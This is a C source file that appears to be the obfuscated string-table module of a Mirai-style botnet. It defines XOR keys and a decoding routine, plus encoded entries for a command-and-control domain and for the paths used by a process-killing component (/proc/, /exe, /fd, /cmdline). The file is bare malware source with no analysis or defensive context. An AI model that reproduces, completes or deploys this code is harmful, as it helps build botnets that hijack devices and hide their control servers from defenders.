#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_keys[] = {
    0x4a3fbc11, 0x473f10cd, 0x1666062, 0x7fd16bb1, 0x5d1b42e5, 0x5f774ead, 
    0x797fc30b, 0x7f4f8f9b, 0x7086ce4f, 0x6f9b6243, 0x5d5633c7, 0x34eae36d, 
    0x57374239, 0x72aa80d3, 0x3f4b24a2, 0x7d28eaf8, 0x1b37ff65, 0x7188758f, 
    0x889722d, 0x6d53d2c2
};

struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
	add_entry(TABLE_CNC_DOMAIN, "\xa2\xaf\xa2\xef\xb3\xa0\xbb\xaf\xa4\xb5\xf3\xf1\xf3\xf0\xef\xac\xad", 17);
    add_entry(TABLE_EXEC_SUCCESS, "\xaf\xa8\xa6\xa6\xa0\xe1\xa3\xa0\xad\xad\xb2", 11);
    
    add_entry(TABLE_KILLER_PROC, "\xee\xb1\xb3\xae\xa2\xee", 6); // /proc/
    add_entry(TABLE_KILLER_EXE, "\xee\xa4\xb9\xa4", 4); // /exe
    add_entry(TABLE_KILLER_FD, "\xee\xa7\xa5", 3); // /fd
    add_entry(TABLE_KILLER_CMDLINE, "\xee\xa2\xac\xa5\xad\xa8\xaf\xa4", 8); // /cmdline

}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("[table] Tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id) {
    struct table_value *val = &table[id];

    for (int i = 0; i < TABLE_KEY_LEN; i++) {

        uint32_t table_key = table_keys[i];

        uint8_t k1 = table_key & 0xff,
                k2 = (table_key >> 8) & 0xff,
                k3 = (table_key >> 16) & 0xff,
                k4 = (table_key >> 24) & 0xff;

        for (int i = 0; i < val->val_len; i++) {
            val->val[i] ^= k1;
            val->val[i] ^= k2;
            val->val[i] ^= k3;
            val->val[i] ^= k4;
        }
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}
